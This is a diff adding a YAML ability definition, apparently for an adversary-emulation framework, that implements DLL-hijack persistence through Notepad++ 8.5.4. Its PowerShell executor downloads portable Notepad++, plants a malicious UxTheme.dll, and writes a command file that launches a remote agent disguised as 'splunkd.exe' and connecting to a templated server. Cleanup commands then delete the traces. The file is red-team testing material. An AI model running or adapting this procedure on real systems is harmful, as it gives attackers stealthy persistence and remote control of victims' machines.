@@ -1,0 +1,63 @@
+- tactic: persistence
+  technique_name: 'Hijack Execution Flow: DLL'
+  technique_id: T1574.001
+  name: Notepad++ DLL Hijack Persistence
+  description: 'This ability exploits a vulnerability in Notepad++ v8.5.4 by downloading
+    the portable version and installing a malicious UxTheme.dll in its directory.
+    When launched, Notepad++ loads this rogue DLL due to Windows'' DLL search order,
+    executing arbitrary code that deploys another agent. Code execution is achieved
+    through a txt file containing the agent deployment command. This file is accessed
+    and written into a buffer through WinAPI calls and then is executed via another
+    WinAPI call.
+
+
+    Cleanup Commands:
+
+
+    The txt file and notepad++ zip file are then deleted
+
+    '
+  executors:
+  - name: psh
+    platform: windows
+    command: 'curl "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5.4/npp.8.5.4.portable.x64.zip"
+      -OutFile "c:\Users\Public\npp.zip";
+
+      Expand-Archive -Path "c:\Users\Public\npp.zip" -DestinationPath "c:\Users\Public\npp"
+      -Force;
+
+      Set-Content -Path "C:\Users\Public\run.txt" -Value "powershell.exe -Command
+      `"Start-Process -FilePath ''C:\Users\Public\splunkd.exe'' -ArgumentList ''-server
+      #{server} -group dllhijack''`"" -Encoding ascii -Force;
+
+      Move-Item -Path "UxTheme.dll" -Destination "c:\Users\Public\npp";
+
+      Start-Process -Filepath "C:\Users\Public\npp\notepad++.exe";
+
+
+      '
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - UxTheme.dll
+    uploads: []
+    timeout: 380
+    parsers: []
+    cleanup:
+    - 'Remove-Item -Path "C:\Users\Public\npp.zip" -Force;
+
+      rm "c:\Users\Public\run.txt"'
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 91919a18-c6e4-4f13-a180-67e1239a9f3b
